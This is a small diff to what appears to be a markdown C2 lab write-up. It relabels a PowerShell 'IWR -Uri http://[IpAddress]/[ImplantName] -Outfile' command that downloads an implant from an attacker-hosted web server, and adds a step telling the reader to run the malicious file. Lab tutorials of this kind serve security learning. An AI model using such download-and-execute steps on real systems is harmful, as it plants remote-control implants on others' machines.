@@ -28,5 +28,9 @@ Next I created quick websever on the Ubuntu machine for the C2 Payload to be ins
 
 ![IWR](https://i.imgur.com/dadsDeX.png)
 
-IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]
+Commad: IWR -Uri http://[IpAddress]/[ImplantName] -Outfile [FileLocation]
+
+After downloading the implant we need to run the malicious file 
+
+[Excute](https://i.imgur.com/mkdYQkp.png)
 
